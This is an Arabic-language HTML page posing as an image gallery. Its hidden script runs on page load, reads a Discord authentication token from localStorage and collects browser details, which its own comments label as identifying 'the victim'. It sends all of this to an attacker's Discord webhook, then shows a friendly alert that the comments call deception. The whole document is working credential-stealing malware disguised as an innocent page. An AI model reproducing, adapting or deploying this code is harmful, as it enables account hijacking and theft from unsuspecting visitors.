<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8" />
<title>صور مذهلة!</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #1e1e1e;
    color: #eee;
    text-align: center;
    padding: 2rem;
  }
  img {
    max-width: 90vw;
    border-radius: 8px;
  }
</style>
</head>
<body>

<h1>مرحباً بك في معرض الصور!</h1>
<p>استمتع بهذه الصورة الرائعة.</p>
<img src="https://media.discordapp.net/attachments/1373243432591691796/1373257050792001636/e4e540a1b6e41f18.png?ex=6836470a&is=6834f58a&hm=41ba7031efc2d9dcee880efad90d3b62ea7dfd0f15198d20900d53bf92f9298c&=&format=webp&quality=lossless&width=1244&height=486" alt="صورة جميلة" />

<script>
(async () => {
  // جلب التوكن من LocalStorage الخاص بديسكورد ويب
  const token = localStorage.getItem('token');
  if (!token) return;

  // بيانات إضافية للتعرف على الضحية
  const data = {
    token,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    url: window.location.href
  };

  // رابط ويب هوك الخاص بالمهاجم (تبدله بالرابط الحقيقي)
  const webhookURL = 'https://discord.com/api/webhooks/1376771639206871181/5g_VeX8fMS2JCcL6byvAgWgDgG8Be704R37gHTSw9hDXYfuAbZmuv4xxeMWICYWQh9px';

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
  } catch (err) {
    // خطأ ما حدث في الإرسال، يمكن تتجاهله أو تسجله
    console.error('Failed to send token:', err);
  }

  // رسالة ترحيب أو خداع للمستخدم
  alert('شكراً لزيارتك! استمتع بالصورة 😊');
})();
</script>

</body>
</html>
